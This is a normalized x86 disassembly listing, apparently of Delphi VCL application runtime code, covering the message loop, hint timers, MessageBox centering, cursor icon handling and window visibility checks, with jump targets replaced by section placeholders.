call sub_469254
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_46914c
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_46919c
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_469128
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_46938c
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_4692f4
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_469c5c
sub_4693b0
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_4186e0
mov eax 0x8
call sub_4026cc
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_4185a4
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_46940c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_418700
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_4026ec
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_4185f0
jmp r-xdata
sub_4694a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push j_sub_403608#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_44f7b4
mov [ esi + 0x44 ] edi
sub_469520
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_4695fe
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_460350
call sub_407d20
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469605
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_463b70
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push j_sub_403608#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_46938c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_462a78
mov eax [ ebp - 0x4 ]
call sub_468ef0
jmp r-xdata
sub_469620
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_40275c
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_40277c
push eax
call sub_40275c
pop edx
call sub_40b734
call sub_40275c
mov edx [ rw-data ]
call sub_4032b4
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_40275c
mov edx eax
mov eax ebx
call sub_469818
pop esi
pop ebx
retn
call sub_40275c
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_4696b0
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_4603d8
mov [ ebp - 0x10 ] eax
call sub_4602f4
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_468654
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_469805
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46980c
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_46048c
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_4602fc
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_469818
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4698d3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_403f50
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_4690dc
mov eax [ ebp - 0x108 ]
call sub_404378
push eax
mov eax [ ebp - 0x4 ]
call sub_404378
mov edx eax
mov eax ebx
pop ecx
call sub_4696b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4698da
lea eax [ ebp - 0x108 ]
call sub_403eb8
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
mov eax [ ebp - 0x4 ]
call sub_4086bc
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402c28
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402a40
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404180
sub_4698f0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_44f974
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_44fadc
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_469f94
test al al
je r-xdata
call sub_44f7d8
mov ebp eax
mov eax edi
call sub_44f7d8
mov ebp eax
mov eax esi
call sub_469f94
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_469a58
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_469ab0
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_469f94
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46a7e0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469ab7
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_469ac0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_469b18
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_469f94
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46a7e0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469b1f
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_469b30
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_403128
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_44914c
jmp r-xdata
sub_469b80
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_467088
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_44f7d8
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_467074
mov ebx eax
mov eax ebx
call sub_44fadc
test al al
je r-xdata
mov eax ebx
call sub_44f7d8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_469be4
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_447830
mov edi eax
call sub_446128
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_44a198
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_44a198
sub_469c5c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_469d6c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_469be4
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_467c38
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_446090
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_469e1c
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push j_sub_403608#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_46a1b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_469b80
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_420b98
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469d73
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403edc
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_469d7c
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_46706c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_467058
movzx edx di
xor ecx ecx
call sub_44a198
inc esi
dec ebx
jne r-xdata
sub_469db8
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_468ed4
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_468ed4
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_469d7c
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_469e1c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_4042c4
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_403f0c
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44285c
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_455f18
xor eax eax
push ebp
push sub_469ea1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403128
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_469eb0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_469f0c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_46706c
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_469eb0
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_467058
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_469eb0
pop ecx
jmp r-xdata
mov eax ebx
call sub_44fadc
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_44f7d8
push eax
call IsChild
test eax eax
jne r-xdata
sub_469f94
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_4057b4
call sub_42cc50
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_469fbc
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_46a000
push sub_467c90
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_46a1b4
sub_46a028
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406b7c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_448ac4
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_447830
call sub_467c70
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_46a1b4
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406b7c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_448ac4
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_46a1b4
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_469fbc
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_44a198
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_46a44c
jmp r-xdata
sub_46a138
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_46a000
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_46a44c
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_46a170
jmp r-xdata
sub_46a170
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44fadc
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_44f7d8
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_44f7d8
push eax
call ShowWindow
sub_46a1b4
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_46a170
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_467df8
mov eax ebx
call sub_46a000
sub_46a1ec
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_46a32e
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_426520
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_407cd4
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_46a2ff
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_4265d8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a306
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4026ec
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_46a1dc
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_46a1dc
mov [ ebp - 0x4 ] eax
sub_46a306
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_46a340
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_403128
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_403070
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_46a3a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_46a43a
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a441
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_403fa8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_4250bc
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40c3e8
mov ebx eax
inc ebx
sub_46a44c
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404850
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_46a7d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_46a1b4
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_469fbc
jmp r-xdata
call sub_4605a4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a7d9
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_403edc
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404920
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_447830
call sub_467c70
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
